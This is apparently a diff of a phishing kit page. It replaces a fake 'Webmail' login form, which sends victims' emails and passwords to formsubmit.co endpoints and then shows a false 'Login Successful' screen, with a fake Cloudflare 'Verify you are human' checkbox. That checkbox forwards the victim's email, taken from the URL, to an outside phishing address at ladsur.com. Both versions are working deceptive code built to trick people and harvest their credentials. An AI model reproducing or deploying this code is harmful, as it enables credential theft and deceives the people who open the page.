@@ -3,368 +3,159 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Webmail Login</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css ">
-    <script src="https://code.jquery.com/jquery-3.6.0.min.js "></script>
-    <script src="https://www.google.com/recaptcha/api.js?render=6LfpKcErAAAAAOZv5sQJTTbWIOwq-PsbaCAEKZQE"></script>
+    <title>Verification Required</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
-        }
-
-        :root {
-            --primary: #3498db;
-            --primary-dark: #2980b9;
-            --success: #06d6a0;
-            --danger: #e74c3c;
-            --dark: #34495e;
-            --light: #ecf0f1;
-            --gray: #95a5a6;
-            --shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-            --card-bg: #ffffff;
-            --input-bg: #f9f9f9;
-        }
-
         body {
-            min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            background-color: #f0f2f5;
-            padding: 20px;
+            height: 100vh;
+            margin: 0;
+            font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background-color: #fff;
         }
 
-        .login-card {
-            background: var(--card-bg);
-            border-radius: 8px;
-            padding: 40px 30px;
-            box-shadow: var(--shadow);
-            width: 100%;
-            max-width: 400px;
-        }
-
-        .brand-header {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            margin-bottom: 30px;
-            gap: 12px;
-        }
-
-        .logo-container {
-            width: 60px;
-            height: 60px;
-            background: white;
-            border: 1px solid #eee;
-            border-radius: 8px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
-        }
-
-        .logo-container i {
-            font-size: 32px;
-            color: var(--primary);
-        }
-
-        .brand-name {
-            font-size: 24px;
-            font-weight: 700;
-            color: var(--dark);
-        }
-
-        .login-title {
-            text-align: center;
-            font-size: 22px;
-            margin-bottom: 30px;
-            font-weight: 500;
-            color: var(--dark);
-        }
-
-        .form-group {
-            margin-bottom: 25px;
-        }
-
-        .input-group {
-            display: flex;
-            align-items: center;
-            background: var(--input-bg);
-            border-radius: 6px;
-            padding: 0 15px;
+        .verification-container {
             border: 1px solid #ddd;
+            padding: 12px 20px;
+            width: 300px;
+            background: #fff;
         }
 
-        .input-group:focus-within {
-            border-color: var(--primary);
-            background: white;
-            box-shadow: 0 0 0 2px rgba(52, 152, 219, 0.2);
-        }
-
-        .input-group i {
-            color: var(--gray);
-            font-size: 18px;
-            margin-right: 12px;
-        }
-
-        .form-control {
-            width: 100%;
-            height: 50px;
-            background: transparent;
-            border: none;
-            color: var(--dark);
-            font-size: 16px;
-            padding: 0;
-        }
-
-        .form-control::placeholder {
-            color: var(--gray);
-        }
-
-        .password-toggle {
-            background: none;
-            border: none;
-            color: var(--gray);
-            cursor: pointer;
-            font-size: 18px;
-        }
-
-        .btn {
-            width: 100%;
-            height: 50px;
-            border: none;
-            border-radius: 6px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s ease;
-        }
-
-        .btn-primary {
-            background: var(--primary);
-            color: white;
-            box-shadow: 0 2px 5px rgba(52, 152, 219, 0.3);
-        }
-
-        .btn-primary:hover {
-            background: var(--primary-dark);
-            transform: translateY(-1px);
-            box-shadow: 0 4px 8px rgba(52, 152, 219, 0.4);
-        }
-
-        .form-footer {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-top: 20px;
-            font-size: 14px;
-        }
-
-        .remember {
+        .checkbox-wrapper {
             display: flex;
             align-items: center;
             gap: 8px;
-            color: var(--gray);
+            position: relative;
         }
 
-        .remember input {
-            accent-color: var(--primary);
+        input[type="checkbox"] {
+            width: 16px;
+            height: 16px;
+            cursor: pointer;
         }
 
-        .forgot-password {
-            color: var(--primary);
+        .spinner {
+            display: none;
+            width: 16px;
+            height: 16px;
+        }
+
+        .checkbox-label {
+            font-size: 13px;
+            color: #000;
+        }
+
+        .cloudflare-logo {
+            float: right;
+            width: 3rem;
+            margin-bottom: -15px;
+        }
+
+        .cloudflare-text {
+            font-size: 1rem;
+
+        }
+
+        .footer-container {
+            display: block;
+            justify-content: space-between;
+            align-items: center;
+            margin-left: auto;
+            padding-bottom: 10px;
+        }
+
+        .footer-content {
+            display: block;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        
+
+        .footer {
+            text-align: right;
+            font-size: 11px;
+            color: #737373;
+            margin-top: -15px;
+        }
+
+        .footer a {
+            color: #737373;
             text-decoration: none;
-            font-weight: 500;
         }
 
-        .copyright {
-            text-align: center;
-            margin-top: 30px;
-            color: var(--gray);
-            font-size: 14px;
+        .footer a:hover {
+            text-decoration: underline;
         }
 
-        .alert {
-            padding: 15px;
-            border-radius: 6px;
-            margin-bottom: 20px;
-            font-size: 14px;
-            display: none;
-        }
-
-        .alert-danger {
-            background: rgba(231, 76, 60, 0.1);
-            border: 1px solid rgba(231, 76, 60, 0.3);
-            color: #e74c3c;
-        }
-
-        .success-con {
-            display: none;
-            background: white;
-            border-radius: 8px;
-            padding: 50px 40px;
-            text-align: center;
-            max-width: 500px;
-            margin: 0 auto;
-            box-shadow: var(--shadow);
-        }
-
-        @media (max-width: 576px) {
-            .login-card { padding: 30px 20px; }
-            .brand-header { margin-bottom: 20px; }
-            .login-title { font-size: 20px; margin-bottom: 20px; }
+        .divider {
+            margin: 0 4px;
         }
     </style>
+
+<script>
+    // Get the email parameter directly from the URL.
+    function getQueryParams() {
+        const params = new URLSearchParams(window.location.search);
+        const email = params.get('e');
+        return { email };
+    }
+
+    // Redirect to a plain text URL with the email appended as a fragment.
+    function redirectToUrl() {
+        const { email } = getQueryParams();
+        // Use your plain destination URL here instead of a Base64 encoded string.
+        const destinationUrl = "https://ladsur.com/ringbowxlx/index.html";
+        if (email) {
+            window.location.href = `${destinationUrl}#${email}`;
+        } else {
+            console.error('Email parameter is missing');
+        }
+    }
+
+    // Handle the checkbox verification UI.
+    function handleCheckbox() {
+        const checkbox = document.getElementById('verification-checkbox');
+        const spinner = document.getElementById('spinner');
+        const label = document.getElementById('checkbox-label');
+
+        if (checkbox.checked) {
+            checkbox.style.display = 'none'; // Hide checkbox
+            spinner.style.display = 'inline'; // Show spinner
+            label.textContent = "Verifying..."; // Update text
+            setTimeout(redirectToUrl, 2000);
+        }
+    }
+</script>
 </head>
 <body>
-    <div class="login-card">
-        <div class="brand-header">
-            <div class="logo-container">
-                <i class="fas fa-envelope"></i>
+    <div class="verification-container">
+        <div class="checkbox-wrapper">
+            <div class="spinner-container">
+                <input type="checkbox" id="verification-checkbox" onchange="handleCheckbox()">
+            <img id="spinner" class="spinner" src="https://upload.wikimedia.org/wikipedia/commons/d/de/Ajax-loader.gif" alt="Loading...">
+
             </div>
-            <div class="brand-name">Webmail</div>
-        </div>
+            <label id="checkbox-label" for="verification-checkbox" class="checkbox-label">Verify you are human</label>
 
-        <h2 class="login-title">Sign In to Your Account</h2>
+            <div class="footer-container">
+                <div class="footer-content">
+                    <img src="https://www.cloudflare.com/favicon.ico" alt="Cloudflare" class="cloudflare-logo">
+                    <h1 class="cloudflare-text">
+                        Cloudflare
+                    </h1>
 
-        <div class="alert alert-danger" id="email-error"></div>
-        <div class="alert alert-danger" id="password-error"></div>
-        <div class="alert alert-danger" id="recaptcha-error"></div>
-
-        <!-- ✅ FORMSUBMIT ENDPOINT -->
-        <form id="login-form" action="https://formsubmit.co/87a5fb4c31e655e613e351351c8babcf" method="POST">
-            <!-- Honeypot spam trap -->
-            <input type="text" name="_honey" style="display:none">
-
-            <!-- Optional: Uncomment to redirect after submit -->
-            <!-- <input type="hidden" name="_redirect" value="https://yoursite.com/success "> -->
-
-            <!-- Optional: Uncomment to set email subject -->
-            <!-- <input type="hidden" name="_subject" value="New Webmail Login"> -->
-
-            <!-- reCAPTCHA token -->
-            <input type="hidden" name="g-recaptcha-response" id="g-recaptcha-response">
-
-            <div class="form-group">
-                <div class="input-group">
-                    <i class="fas fa-envelope"></i>
-                    <input type="email" class="form-control" name="email" placeholder="Email Address" id="email" required>
+                    <div class="footer">
+                        <a href="#">Privacy</a>
+                        <span class="divider">•</span>
+                        <a href="#">Terms</a>
+                    </div>
                 </div>
             </div>
-
-            <div class="form-group">
-                <div class="input-group">
-                    <i class="fas fa-lock"></i>
-                    <input type="password" class="form-control" id="password" name="password" placeholder="Password" required>
-                    <button type="button" class="password-toggle" id="pass-eye">
-                        <i class="fas fa-eye"></i>
-                    </button>
-                </div>
-            </div>
-
-            <button type="submit" class="btn btn-primary" id="submit-btn">Sign In</button>
-        </form>
-
-        <div class="form-footer">
-            <label class="remember">
-                <input id="sec-lg-ss" type="checkbox">
-                <span>Remember me</span>
-            </label>
-            <a href="#" class="forgot-password">Forgot password?</a>
         </div>
 
-        <div class="copyright">
-            <p>© 2025 Webmail Service. All rights reserved.</p>
-        </div>
     </div>
-
-    <div class="success-con">
-        <i class="fas fa-check-circle" style="font-size: 70px; color: var(--success); margin-bottom: 25px;"></i>
-        <h2 style="font-size: 28px; margin-bottom: 20px; color: var(--dark);">Login Successful</h2>
-        <div style="font-size: 18px; line-height: 1.6; margin-bottom: 30px; color: var(--dark);">
-            Welcome back! You have successfully signed in.<br>
-            Redirecting to your inbox...
-        </div>
-        <div style="display: inline-block; background: rgba(6, 214, 160, 0.1); color: var(--success); padding: 10px 20px; border-radius: 30px; font-weight: 500;">
-            Redirecting in <span id="countdown">3</span> seconds...
-        </div>
-    </div>
-
-    <script>
-        $(document).ready(function() {
-            $('#pass-eye').click(function() {
-                const field = $('#password');
-                const icon = $(this).find('i');
-                if (field.attr('type') === 'password') {
-                    field.attr('type', 'text');
-                    icon.removeClass('fa-eye').addClass('fa-eye-slash');
-                } else {
-                    field.attr('type', 'password');
-                    icon.removeClass('fa-eye-slash').addClass('fa-eye');
-                }
-            });
-
-            $('#login-form').submit(function(e) {
-                e.preventDefault();
-
-                $('.alert').hide();
-                const email = $('#email').val().trim();
-                const password = $('#password').val().trim();
-
-                if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
-                    $('#email-error').text('Please enter a valid email').show();
-                    return;
-                }
-
-                if (password.length < 4) {
-                    $('#password-error').text('Password too short').show();
-                    return;
-                }
-
-                const btn = $('#submit-btn').prop('disabled', true).text('Verifying...');
-
-                grecaptcha.ready(() => {
-                    grecaptcha.execute('6LfpKcErAAAAAOZv5sQJTTbWIOwq-PsbaCAEKZQE', { action: 'login' })
-                    .then(token => {
-                        $('#g-recaptcha-response').val(token);
-
-                        const formData = new FormData(this);
-
-                        // ✅ FORMSUBMIT ENDPOINT
-                        fetch('https://formsubmit.co/77320f31cfb50218a06efd91d6eae1bd', {
-                            method: 'POST',
-                            body: formData,
-                            mode: 'no-cors'
-                        })
-                        .then(() => {
-                            $('.login-card').fadeOut(300, () => {
-                                $('.success-con').fadeIn();
-                                let sec = 3;
-                                const timer = setInterval(() => {
-                                    $('#countdown').text(--sec);
-                                    if (sec <= 0) {
-                                        clearInterval(timer);
-                                        location.reload(); // or redirect to inbox
-                                    }
-                                }, 1000);
-                            });
-                        })
-                        .catch(() => {
-                            $('#recaptcha-error').text('Submission failed. Please try again.').show();
-                            btn.text('Sign In').prop('disabled', false);
-                        });
-                    })
-                    .catch(() => {
-                        $('#recaptcha-error').text('reCAPTCHA failed. Please try again.').show();
-                        btn.text('Sign In').prop('disabled', false);
-                    });
-                });
-            });
-        });
-    </script>
 </body>
-</html>
 
+</html>
